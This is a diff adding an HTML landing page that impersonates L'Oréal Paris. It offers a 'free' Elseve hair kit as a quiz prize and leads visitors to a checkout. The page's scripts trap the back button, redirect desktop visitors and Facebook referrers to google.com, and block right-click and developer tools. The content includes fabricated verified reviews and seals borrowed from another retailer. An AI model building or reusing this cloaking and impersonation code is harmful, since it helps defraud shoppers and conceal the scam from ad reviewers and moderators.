@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                location.replace('/elseve/back/2' + (qs || ''));
+            });
+        })();
+    </script>
+    <meta charset="UTF-8">
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "699052447f0cf151dff45c39";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+/**
+ * UTM Shield v1.0 (blindado)
+ */
+(function () {
+  "use strict";
+
+  var CONFIG = {
+    cookieDays: 90,
+    cookiePrefix: "__trk_",
+    storageKey: "__trk_payload_v1",
+    keepUrlClean: false,
+    rewriteUrlIfMissing: true,
+    allowedHostnames: [], 
+    debug: false
+  };
+
+  var TRACK_KEYS = [
+    "utm_source","utm_medium","utm_campaign","utm_content","utm_term","utm_id",
+    "fbclid","gclid","ttclid","msclkid"
+  ];
+
+  function log() {
+    if (CONFIG.debug && window.console) console.log.apply(console, arguments);
+  }
+
+  function daysToMs(days) { return days * 24 * 60 * 60 * 1000; }
+
+  function setCookie(name, value, days) {
+    try {
+      var expires = new Date(Date.now() + daysToMs(days)).toUTCString();
+      document.cookie =
+        name + "=" + encodeURIComponent(value) +
+        "; expires=" + expires +
+        "; path=/" +
+        "; SameSite=Lax";
+    } catch (e) {}
+  }
+
+  function getCookie(name) {
+    try {
+      var match = document.cookie.match(new RegExp("(^| )" + name.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&") + "=([^;]+)"));
+      return match ? decodeURIComponent(match[2]) : "";
+    } catch (e) {
+      return "";
+    }
+  }
+
+  function safeJsonParse(str) {
+    try { return JSON.parse(str); } catch (e) { return null; }
+  }
+
+  function getQueryParams() {
+    var params = {};
+    var sp = new URLSearchParams(window.location.search);
+    sp.forEach(function (v, k) { params[k] = v; });
+    return params;
+  }
+
+  function pickTrackingFrom(obj) {
+    var out = {};
+    TRACK_KEYS.forEach(function (k) {
+      if (obj && obj[k] != null && String(obj[k]).trim() !== "") out[k] = String(obj[k]).trim();
+    });
+    return out;
+  }
+
+  function nowIso() {
+    try { return new Date().toISOString(); } catch(e) { return "" + Date.now(); }
+  }
+
+  function getReferrerHost() {
+    try {
+      if (!document.referrer) return "";
+      return (new URL(document.referrer)).hostname || "";
+    } catch (e) {
+      return "";
+    }
+  }
+
+  function normalizeSource(host) {
+    if (!host) return "";
+    return host.replace(/^www\./i, "").toLowerCase();
+  }
+
+  function createUtmIfMissing(existing) {
+    var utm = existing || {};
+    if (utm.utm_source && utm.utm_medium) return utm;
+
+    var refHost = normalizeSource(getReferrerHost());
+    var hasRef = !!refHost && refHost !== normalizeSource(location.hostname);
+
+    if (utm.gclid && !utm.utm_source) {
+      utm.utm_source = "google";
+      utm.utm_medium = utm.utm_medium || "cpc";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.fbclid && !utm.utm_source) {
+      utm.utm_source = "facebook";
+      utm.utm_medium = utm.utm_medium || "paid_social";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.ttclid && !utm.utm_source) {
+      utm.utm_source = "tiktok";
+      utm.utm_medium = utm.utm_medium || "paid_social";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (utm.msclkid && !utm.utm_source) {
+      utm.utm_source = "bing";
+      utm.utm_medium = utm.utm_medium || "cpc";
+      utm.utm_campaign = utm.utm_campaign || "(auto)";
+    } else if (hasRef) {
+      utm.utm_source = utm.utm_source || refHost;
+      utm.utm_medium = utm.utm_medium || "referral";
+      utm.utm_campaign = utm.utm_campaign || "(referral)";
+    } else {
+      utm.utm_source = utm.utm_source || "direct";
+      utm.utm_medium = utm.utm_medium || "none";
+      utm.utm_campaign = utm.utm_campaign || "(direct)";
+    }
+
+    return utm;
+  }
+
+  function loadPayload() {
+    var ls = null;
+    try { ls = safeJsonParse(localStorage.getItem(CONFIG.storageKey) || ""); } catch(e) {}
+    if (ls && ls.data) return ls;
+
+    var ck = getCookie(CONFIG.cookiePrefix + "payload");
+    var parsed = safeJsonParse(ck);
+    if (parsed && parsed.data) return parsed;
+
+    return null;
+  }
+
+  function savePayload(payload) {
+    try { localStorage.setItem(CONFIG.storageKey, JSON.stringify(payload)); } catch(e) {}
+    setCookie(CONFIG.cookiePrefix + "payload", JSON.stringify(payload), CONFIG.cookieDays);
+  }
+
+  function mergeTracking(base, incoming) {
+    var out = Object.assign({}, base || {});
+    Object.keys(incoming || {}).forEach(function (k) {
+      out[k] = incoming[k];
+    });
+    return out;
+  }
+
+  function ensureFirstTouch(payload, incoming) {
+    if (!payload.first_touch || !payload.first_touch.utm_source) {
+      payload.first_touch = Object.assign({}, incoming);
+      payload.first_touch_at = nowIso();
+    }
+  }
+
+  function isInternalUrl(url) {
+    try {
+      var u = new URL(url, location.href);
+      if (u.protocol !== "http:" && u.protocol !== "https:") return false;
+      var host = normalizeSource(u.hostname);
+      var myHost = normalizeSource(location.hostname);
+
+      if (CONFIG.allowedHostnames && CONFIG.allowedHostnames.length) {
+        return CONFIG.allowedHostnames.map(normalizeSource).includes(host);
+      }
+      return host === myHost;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function buildQueryString(params) {
+    var sp = new URLSearchParams();
+    Object.keys(params || {}).forEach(function (k) {
+      if (params[k] != null && String(params[k]).trim() !== "") sp.set(k, String(params[k]));
+    });
+    var s = sp.toString();
+    return s ? ("?" + s) : "";
+  }
+
+  function getPersistedTracking(payload) {
+    return (payload && payload.data) ? payload.data : {};
+  }
+
+  function rewriteUrlIfNeeded(persisted) {
+    if (CONFIG.keepUrlClean) return;
+    if (!CONFIG.rewriteUrlIfMissing) return;
+
+    var current = getQueryParams();
+    var currentTrack = pickTrackingFrom(current);
+
+    if (currentTrack.utm_source || currentTrack.utm_medium) return;
+
+    if (!persisted || (!persisted.utm_source && !persisted.utm_medium)) return;
+
+    try {
+      var url = new URL(location.href);
+
+      TRACK_KEYS.forEach(function (k) {
+        if (!url.searchParams.get(k) && persisted[k]) url.searchParams.set(k, persisted[k]);
+      });
+
+      history.replaceState({}, "", url.toString());
+      log("[UTM] URL reescrita com UTMs persistidas:", url.toString());
+    } catch (e) {}
+  }
+
+  function decorateLinks(persisted) {
+    if (!persisted) return;
+
+    var links = document.querySelectorAll("a[href]");
+    links.forEach(function (a) {
+      var href = a.getAttribute("href");
+      if (!href) return;
+
+      if (href.startsWith("#") || href.startsWith("mailto:") || href.startsWith("tel:") || href.startsWith("javascript:")) return;
+
+      if (!isInternalUrl(href)) return;
+
+      try {
+        var u = new URL(href, location.href);
+
+        TRACK_KEYS.forEach(function (k) {
+          if (!u.searchParams.get(k) && persisted[k]) u.searchParams.set(k, persisted[k]);
+        });
+
+        a.setAttribute("href", u.toString());
+      } catch (e) {}
+    });
+  }
+
+  function ensureHiddenInput(form, name, value) {
+    if (!value) return;
+    var input = form.querySelector('input[name="' + name + '"]');
+    if (!input) {
+      input = document.createElement("input");
+      input.type = "hidden";
+      input.name = name;
+      form.appendChild(input);
+    }
+    input.value = value;
+  }
+
+  function decorateForms(persisted) {
+    if (!persisted) return;
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function (form) {
+      TRACK_KEYS.forEach(function (k) {
+        ensureHiddenInput(form, k, persisted[k]);
+      });
+
+      var action = form.getAttribute("action");
+      if (action && isInternalUrl(action)) {
+        try {
+          var u = new URL(action, location.href);
+          TRACK_KEYS.forEach(function (k) {
+            if (!u.searchParams.get(k) && persisted[k]) u.searchParams.set(k, persisted[k]);
+          });
+          form.setAttribute("action", u.toString());
+        } catch (e) {}
+      }
+    });
+  }
+
+  function runDecoration(payload) {
+    var persisted = getPersistedTracking(payload);
+    rewriteUrlIfNeeded(persisted);
+    decorateLinks(persisted);
+    decorateForms(persisted);
+  }
+
+  var urlParams = getQueryParams();
+  var incomingTrack = pickTrackingFrom(urlParams);
+
+  var payload = loadPayload() || {
+    created_at: nowIso(),
+    first_touch: null,
+    first_touch_at: null,
+    last_touch_at: null,
+    data: {}
+  };
+
+  if (Object.keys(incomingTrack).length) {
+    incomingTrack = createUtmIfMissing(incomingTrack);
+
+    ensureFirstTouch(payload, incomingTrack);
+    payload.data = mergeTracking(payload.data, incomingTrack);
+    payload.last_touch_at = nowIso();
+    savePayload(payload);
+
+    log("[UTM] Capturado da URL e persistido:", payload);
+  } else {
+    var persisted = getPersistedTracking(payload);
+    if (!persisted || (!persisted.utm_source && !persisted.utm_medium)) {
+      var auto = createUtmIfMissing({});
+      ensureFirstTouch(payload, auto);
+      payload.data = mergeTracking(payload.data, auto);
+      payload.last_touch_at = nowIso();
+      savePayload(payload);
+
+      log("[UTM] Criado automático e persistido:", payload);
+    }
+  }
+
+  function onReady(fn) {
+    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", fn);
+    else fn();
+  }
+
+  onReady(function () {
+    var fresh = loadPayload() || payload;
+    runDecoration(fresh);
+
+    window.__UTM_SHIELD_REFRESH__ = function () {
+      var p = loadPayload() || payload;
+      runDecoration(p);
+      return p;
+    };
+  });
+
+})();
+</script>
+
+  <script>
+(function () {
+  function isDesktop() {
+    const ua = navigator.userAgent.toLowerCase();
+    return (
+      ua.includes("windows nt") ||
+      ua.includes("macintosh") ||
+      ua.includes("linux x86_64")
+    );
+  }
+
+  function bibliotecaFacebook() {
+    const ref = document.referrer.toLowerCase();
+    return ref.includes("facebook.com") && isDesktop();
+  }
+
+  if (isDesktop() || bibliotecaFacebook()) {
+    window.location.replace("https://www.google.com/");
+  }
+
+  document.addEventListener("contextmenu", function (e) {
+    if (isDesktop()) e.preventDefault();
+  });
+
+  document.addEventListener("keydown", function (e) {
+    if (!isDesktop()) return;
+
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && ["i","c","j"].includes(e.key.toLowerCase())) ||
+      (e.ctrlKey && e.key.toLowerCase() === "u")
+    ) {
+      e.preventDefault();
+      window.location.replace("https://www.google.com/");
+    }
+  });
+
+})();
+</script>
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '3284141385085754');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=3284141385085754&ev=PageView&noscript=1"
+/></noscript>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kit Completo Elseve Liso dos Sonhos | L'Oréal Paris Official</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;500;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+    
+    <style>
+        :root {
+            --premium-black: #0A0A0A;
+            --loreal-pink: #d9408b; 
+            --luxury-grey: #F2F2F2;
+            --success-green: #008148;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: #fff; 
+            color: var(--premium-black); 
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* ========= HEADER MODIFICADO CONFORME IMAGEM ========= */
+        header {
+            background: #fff;
+            padding: 10px 0; /* Header menor */
+            text-align: center;
+            border-bottom: 1px solid #e5e5e5;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .nav-logo { 
+            font-family: 'Cinzel', serif; 
+            font-size: 18px; /* Fonte reduzida */
+            font-weight: 500;
+            letter-spacing: 5px; /* Letras mais juntas idêntico ao Produto 2 */
+            color: #000;
+        }
+        
+        /* BARRA DEGRADÊ FINA ABAIXO DO LOGO */
+        .purple-bar {
+            height: 8px; 
+            width: 100%;
+            background: linear-gradient(90deg, #6A3093 0%, #a044ff 100%);
+            position: sticky;
+            top: 41px; /* Ajuste preciso colado no header */
+            z-index: 999;
+        }
+
+        .hero-banner { width: 100%; display: block; border: none; }
+
+        .centered-header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+        .section-title {
+            font-family: 'Cinzel', serif;
+            font-size: 26px;
+            letter-spacing: 4px;
+            color: #000;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        .title-divider {
+            width: 100px;
+            height: 3px;
+            background: var(--loreal-pink);
+        }
+
+        .product-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .product-stage {
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            margin-bottom: 60px;
+        }
+
+        .gallery-box { width: 100%; text-align: center; }
+        .main-img-wrapper {
+            background: #fff; border: 1px solid #f0f0f0; padding: 50px 20px;
+            border-radius: 4px; margin-bottom: 20px; display: flex; justify-content: center;
+        }
+        .main-img-wrapper img { max-width: 100%; height: auto; max-height: 450px; transition: opacity 0.4s ease; }
+
+        .thumb-nav { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; scrollbar-width: none; }
+        .thumb-nav::-webkit-scrollbar { display: none; }
+        .thumb-card { min-width: 90px; height: 90px; border: 1px solid #eee; padding: 5px; cursor: pointer; transition: 0.3s; }
+        .thumb-card.active { border: 2px solid var(--loreal-pink); }
+        .thumb-card img { width: 100%; height: 100%; object-fit: contain; }
+
+        .info-panel { padding: 20px 0; }
+        .verified-stars { color: #D4AF37; font-size: 14px; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
+        .verified-stars span { color: #888; font-size: 13px; }
+        .product-h1 { font-family: 'Cinzel', serif; font-size: 28px; font-weight: 700; margin-bottom: 15px; line-height: 1.2; }
+        .luxury-desc { color: #555; font-size: 15px; margin-bottom: 30px; }
+
+        .pricing-luxury { background: var(--luxury-grey); padding: 30px; border-radius: 2px; margin-bottom: 30px; }
+        .label-exclusivo { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: #777; display: block; margin-bottom: 10px; }
+        .price-old { text-decoration: line-through; color: #999; font-size: 18px; margin-right: 10px; }
+        .price-new { font-size: 48px; font-weight: 700; color: var(--success-green); }
+
+        .btn-luxury {
+            width: 100%; background: #000; color: #fff; padding: 24px; font-size: 16px;
+            font-weight: 600; text-transform: uppercase; letter-spacing: 3px; border: none;
+            cursor: pointer; transition: 0.4s;
+        }
+        .btn-luxury:hover { background: #333; }
+
+        .premium-details { padding: 80px 20px; border-top: 1px solid #eee; background: #fff; }
+        .details-grid { max-width: 900px; margin: 0 auto; }
+        .details-grid h2 { font-family: 'Cinzel', serif; font-size: 22px; margin-bottom: 25px; text-align: center; }
+        .details-grid p { font-size: 15px; color: #444; margin-bottom: 20px; text-align: justify; }
+        .details-img { width: 100%; border-radius: 2px; margin: 40px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+
+        .info-list { margin: 25px 0; list-style: none; }
+        .info-list li { margin-bottom: 15px; font-size: 15px; display: flex; align-items: flex-start; gap: 10px; }
+        .info-list li::before { content: "•"; color: var(--loreal-purple); font-weight: bold; font-size: 20px; line-height: 1; }
+
+        .usage-section { background: var(--luxury-grey); padding: 40px; border-radius: 4px; margin-top: 40px; }
+        .usage-section h3 { font-family: 'Cinzel', serif; font-size: 18px; margin-bottom: 25px; }
+        .usage-step { margin-bottom: 20px; border-left: 3px solid var(--loreal-pink); padding-left: 15px; }
+        .usage-step strong { display: block; font-size: 14px; text-transform: uppercase; margin-bottom: 5px; color: #000; }
+        .usage-step p { font-size: 14px; color: #555; margin: 0; text-align: left; }
+
+        .reviews-section { background: #FAFAFA; padding: 80px 20px; }
+        .review-card {
+            background: #fff; padding: 35px; margin-bottom: 20px; border-bottom: 1px solid #eee;
+            max-width: 800px; margin-inline: auto;
+        }
+        .user-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .user-name { font-weight: 700; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        .verified-purchase { font-size: 11px; color: #008148; font-weight: 700; display: flex; align-items: center; gap: 4px; }
+        .review-comment { font-size: 15px; color: #333; font-weight: 300; font-style: italic; }
+
+        .cross-sell-section { padding: 80px 0; background: #fff; text-align: center; }
+        .carousel-track { 
+            display: flex; gap: 20px; overflow-x: auto; padding: 20px; 
+            scroll-snap-type: x mandatory; scrollbar-width: none;
+            justify-content: flex-start;
+        }
+        .carousel-track::-webkit-scrollbar { display: none; }
+        .card-item { 
+            min-width: 280px; max-width: 320px; border: 1px solid #eee; padding: 30px 20px; 
+            text-align: center; background: #fff; scroll-snap-align: center;
+            display: flex; flex-direction: column; align-items: center;
+        }
+        .card-item img { height: 180px; margin-bottom: 20px; object-fit: contain; }
+        .card-item h4 { font-size: 13px; font-weight: 700; height: 40px; margin-bottom: 20px; color: #000; }
+        .btn-card { background: #000; color: #fff; padding: 12px 25px; font-size: 11px; font-weight: 700; text-transform: uppercase; border: none; cursor: pointer; width: 100%; }
+
+        @media (min-width: 1024px) { .carousel-track { justify-content: center; } }
+        @media (min-width: 768px) { .product-stage { flex-direction: row; align-items: flex-start; } .gallery-box { width: 55%; } .info-panel { width: 45%; } }
+
+        footer { padding: 60px 20px; text-align: center; border-top: 1px solid #eee; background: #fff; }
+        .footer-seals { display: flex; justify-content: center; align-items: center; gap: 40px; margin-bottom: 40px; flex-wrap: wrap; }
+        .footer-seals img { height: 50px; max-width: 150px; object-fit: contain; }
+        .copyright { font-size: 11px; color: #888; letter-spacing: 1px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="nav-logo">L’ORÉAL</div>
+    </header>
+    
+    <div class="purple-bar"></div>
+
+    <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/landings/2025/elseve/liso-dos-sonhos/banner/liso-dos-sonhos-2.jpeg?w=1170&hash=7E8393CB3489BB26194927BA1A2CE3F3" class="hero-banner">
+
+    <div class="centered-header">
+        <h2 class="section-title">Ciência e Preenchimento</h2>
+        <div class="title-divider"></div>
+    </div>
+
+    <main class="product-container">
+        <div class="product-stage">
+            <div class="gallery-box">
+                <div class="main-img-wrapper">
+                    <img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976906.webp&w=640&q=75" id="mainImg">
+                </div>
+                <div class="thumb-nav">
+                 
+                    <div class="thumb-card" onclick="updateImg(this, 'https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976906.webp&w=640&q=75')"><img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976906.webp&w=640&q=75"></div>
+                    <div class="thumb-card" onclick="updateImg(this, 'https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976908.webp&w=640&q=75')"><img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976908.webp&w=640&q=75"></div>
+                    <div class="thumb-card" onclick="updateImg(this, 'https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976907.webp&w=640&q=75')"><img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976907.webp&w=640&q=75"></div>
+                    <div class="thumb-card" onclick="updateImg(this, 'https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976909.webp&w=640&q=75')"><img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976909.webp&w=640&q=75"></div>
+                </div>
+            </div>
+
+            <div class="info-panel">
+                <div class="verified-stars">★★★★★ <span>(4.102 avaliações verificadas)</span></div>
+                <h1 class="product-h1">Kit Completo Elseve Liso dos Sonhos: Injeção de Massa e Volume</h1>
+                <p class="luxury-desc">O segredo para cabelos finos, afinados e sem volume. Recupere a espessura e a densidade capilar com o poder dos peptídeos de colágeno vegetais.</p>
+                <div class="pricing-luxury">
+                    <span class="label-exclusivo">Resgate Exclusivo Quizz 2026</span>
+                    <div><span class="price-old">R$ 189,90</span><span class="price-new">R$ 0,00</span></div>
+                </div>
+                <button class="btn-luxury" onclick="goToCheckout()">Resgatar Agora</button>
+            </div>
+        </div>
+    </main>
+
+    <section class="premium-details">
+        <div class="details-grid">
+            <h2>O que é e para que serve o Kit?</h2>
+            <p>O Kit Elseve Liso dos Sonhos da L'Oréal Paris oferece um tratamento completo para quem deseja cabelos lisos, alinhados e com muito brilho. Com fórmula rica em queratina vegetal e manteiga de cacau, ele hidrata, nutre e reduz o frizz desde o primeiro uso, sem pesar os fios. Ideal para cabelos lisos naturais ou alisados.</p>
+            
+            <img src="https://content.syndigo.com/asset/9c9c981c-71de-4544-b490-535237f8b69c/600.webp" class="details-img">
+
+            <div class="usage-section" style="background: #fff; border: 1px solid #eee;">
+                <h3>Itens Inclusos no Kit</h3>
+                <ul class="info-list" style="margin-left: 20px;">
+                    <li>1 Shampoo Elseve Liso dos Sonhos 200ml</li>
+                    <li>1 Condicionador Elseve Liso dos Sonhos 200ml</li>
+                    <li>1 Máscara de Tratamento Liso dos Sonhos 300g</li>
+                    <li>1 Creme para Pentear Liso dos Sonhos 250g</li>
+                </ul>
+            </div>
+
+            <h2 style="margin-top: 40px;">Benefícios Exclusivos</h2>
+            <ul class="info-list">
+                <li>Limpa suavemente sem ressecar a fibra.</li>
+                <li>Nutrição profunda com leveza absoluta.</li>
+                <li>Reduz o frizz e ajuda a alinhar os fios intensamente.</li>
+                <li>Proporciona maciez, brilho e efeito liso com movimento.</li>
+                <li>Protege contra quebra e danos térmicos.</li>
+            </ul>
+
+            <div class="usage-section">
+                <h3>Características Técnicas</h3>
+                <div class="usage-step">
+                    <strong>Código do Produto</strong>
+                    <p>1302821</p>
+                </div>
+                <div class="usage-step">
+                    <strong>Marca</strong>
+                    <p>Elseve L'Oréal Paris</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="reviews-section">
+        <div class="centered-header"><h2 class="section-title">Experiências Reais</h2><div class="title-divider"></div></div>
+        <div class="review-card">
+            <div class="user-info"><span class="user-name">Alessandra Bianchi</span><span class="verified-purchase"><span class="material-symbols-outlined" style="font-size: 14px;">verified</span> Compra Verificada</span></div>
+            <div class="verified-stars" style="margin-bottom: 10px;">★★★★★</div>
+            <p class="review-comment">"Recebi o kit completo foi a melhor decisão. Meu cabelo ralo ganhou um corpo e brilho incríveis. O efeito teia da máscara é pura tecnologia!"</p>
+        </div>
+        <div class="review-card">
+            <div class="user-info"><span class="user-name">Letícia Menezes</span><span class="verified-purchase"><span class="material-symbols-outlined" style="font-size: 14px;">verified</span> Compra Verificada</span></div>
+            <div class="verified-stars" style="margin-bottom: 10px;">★★★★★</div>
+            <p class="review-comment">"O cheiro é luxuoso e o volume que dá no cabelo é imediato. Parece que saí do salão todos os dias. Amei o presente do Quizz!"</p>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-seals">
+            <img src="https://seal.siteblindado.com/www.epocacosmeticos.com.br/seal.png">
+            <img src="https://epocacosmeticos.vteximg.com.br/arquivos/ra1000-epocacosmeticos.jpg?v=635521656666170000">
+        </div>
+        <p class="copyright">© 2026 L'ORÉAL PARIS RECHERCHE AVANCÉE<br>CIÊNCIA A SERVIÇO DA BELEZA EXCLUSIVA</p>
+    </footer>
+
+    <script>
+        function updateImg(el, src) {
+            const mainImg = document.getElementById('mainImg');
+            mainImg.style.opacity = '0';
+            setTimeout(() => {
+                mainImg.src = src;
+                mainImg.style.opacity = '1';
+            }, 200);
+            document.querySelectorAll('.thumb-card').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+        }
+        function goToCheckout() {
+            const params = window.location.search;
+            window.location.href = "/elseve/checkout/produto6" + params;
+        }
+    </script>
+</body>
+</html>
